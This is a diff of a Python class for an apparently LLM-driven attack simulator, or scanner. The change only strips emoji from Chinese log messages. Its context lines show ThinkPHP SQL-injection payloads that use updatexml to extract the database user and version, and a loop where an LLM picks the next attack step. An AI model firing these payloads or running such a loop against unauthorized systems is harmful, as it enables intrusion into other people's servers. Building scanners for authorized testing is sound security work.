@@ -96,7 +96,7 @@ class AttackSimulator:
         
     async def run_simulation(self) -> Dict[str, Any]:
         """执行完整的模拟攻击流程"""
-        logger.info(f"🚀 开始对 {self.target} 进行模拟攻击 (策略: {self.strategy})")
+        logger.info(f" 开始对 {self.target} 进行模拟攻击 (策略: {self.strategy})")
         
         async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
             # 1. 侦察阶段
@@ -108,7 +108,7 @@ class AttackSimulator:
                 fw_lower = recon_result.primary_framework.lower()
                 if fw_lower in FRAMEWORK_NAME_MAP:
                     self.detected_frameworks.append(FRAMEWORK_NAME_MAP[fw_lower])
-                logger.info(f"📦 主框架: {recon_result.primary_framework}")
+                logger.info(f" 主框架: {recon_result.primary_framework}")
             
             # 更新上下文,供 LLM 动态决策
             self.context["detected_frameworks"] = [fw.value for fw in self.detected_frameworks]
@@ -127,14 +127,14 @@ class AttackSimulator:
                 elif 'wordpress' in ' '.join(tech_lower):
                     self.context["entry_points"] = ["/wp-login.php", "/xmlrpc.php"]
             
-            logger.info(f"🔍 侦察完成，识别技术栈: {self.context['technologies']}")
-            logger.info(f"📦 检测到的框架: {self.context['detected_frameworks']}")
-            logger.info(f"🔑 发现的入口点: {self.context['entry_points']}")
+            logger.info(f" 侦察完成，识别技术栈: {self.context['technologies']}")
+            logger.info(f" 检测到的框架: {self.context['detected_frameworks']}")
+            logger.info(f" 发现的入口点: {self.context['entry_points']}")
 
             # 2. VULHUB 快速扫描
             found_vulns = []
             if self.enable_vulhub_scan:
-                logger.info("🔧 开始 VULHUB 快速扫描...")
+                logger.info(" 开始 VULHUB 快速扫描...")
             vulhub_payloads = [
                 {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,user()),0)]": "1"}},
                 {"path": "index.php", "params": {"s": "/index/index/index", "ids[0,updatexml(0,concat(0xa,version()),0)]": "1"}},
@@ -159,7 +159,7 @@ class AttackSimulator:
                     self.history.append(step)
                     
                     if self._is_potential_vuln(step):
-                        logger.info(f"🎯 疑似 ThinkPHP SQL 注入,规则引擎验证...")
+                        logger.info(f" 疑似 ThinkPHP SQL 注入,规则引擎验证...")
                         is_valid, reason = self.rule_engine.validate_vulnerability(
                             plugin_id="thinkphp-sqli",
                             detected_frameworks=self.detected_frameworks,
@@ -172,7 +172,7 @@ class AttackSimulator:
                         )
                         
                         if is_valid:
-                            logger.info(f"✅ 规则引擎确认: {reason}")
+                            logger.info(f" 规则引擎确认: {reason}")
                             
                             found_vulns.append(self._build_vuln_record(
                                 url=str(resp.url),
@@ -188,15 +188,15 @@ class AttackSimulator:
                                 confidence=0.8,
                             ))
                         else:
-                            logger.info(f"❌ 规则引擎未确认: {reason}")
+                            logger.info(f" 规则引擎未确认: {reason}")
                 except Exception as e:
                     logger.warning(f"VULHUB payload 测试失败: {e}")
             else:
-                logger.info("⏭️ 跳过 VULHUB 扫描（定向模式）")
+                logger.info(" 跳过 VULHUB 扫描（定向模式）")
             
             # 如果已发现漏洞,直接返回结果,不再进行 LLM 循环
             if found_vulns:
-                logger.info(f"✅ VULHUB 扫描完成,发现 {len(found_vulns)} 个漏洞")
+                logger.info(f" VULHUB 扫描完成,发现 {len(found_vulns)} 个漏洞")
                 return {
                     "target": self.target,
                     "vulnerabilities": found_vulns,
@@ -209,7 +209,7 @@ class AttackSimulator:
                 
                 # 调用 LLM 决策下一步
                 decision = await self.llm.decide_next_step(self.context)
-                logger.info(f"🤖 LLM 决策 (第 {i+1} 轮): {decision['action']} - {decision['reason']}")
+                logger.info(f" LLM 决策 (第 {i+1} 轮): {decision['action']} - {decision['reason']}")
 
                 if decision["action"] == "terminate":
                     break
@@ -242,7 +242,7 @@ class AttackSimulator:
 
                 # 3. 规则引擎验证 (替代原有简单判断)
                 if self._is_potential_vuln(step):
-                    logger.info(f"🎯 发现疑似漏洞，开始规则引擎验证...")
+                    logger.info(f" 发现疑似漏洞，开始规则引擎验证...")
                     
                     # 使用规则引擎验证
                     is_valid, validation_reason = self.rule_engine.validate_vulnerability(
@@ -257,7 +257,7 @@ class AttackSimulator:
                     )
                     
                     if is_valid:
-                        logger.info(f"✅ 规则引擎确认漏洞有效: {validation_reason}")
+                        logger.info(f" 规则引擎确认漏洞有效: {validation_reason}")
                         
                         found_vulns.append(self._build_vuln_record(
                             url=step.url,
@@ -274,7 +274,7 @@ class AttackSimulator:
                         ))
                     else:
                         # 回退到 LLM 验证
-                        logger.info(f"🔄 规则引擎未确认，尝试 LLM 验证...")
+                        logger.info(f" 规则引擎未确认，尝试 LLM 验证...")
                         evidence = {
                             "vuln_name": "Potential Vulnerability",
                             "url": step.url,
@@ -285,7 +285,7 @@ class AttackSimulator:
                         verification = await self.llm.verify_vulnerability(evidence)
                         
                         if verification.get("is_valid"):
-                            logger.info(f"✅ LLM 确认漏洞有效: {verification['analysis']}")
+                            logger.info(f" LLM 确认漏洞有效: {verification['analysis']}")
                             
                             found_vulns.append(self._build_vuln_record(
                                 url=step.url,
@@ -302,7 +302,7 @@ class AttackSimulator:
                                 verification_result=verification,
                             ))
                         else:
-                            logger.info(f"❌ LLM 判定为误报: {verification['analysis']}")
+                            logger.info(f" LLM 判定为误报: {verification['analysis']}")
 
             return {
                 "target": self.target,
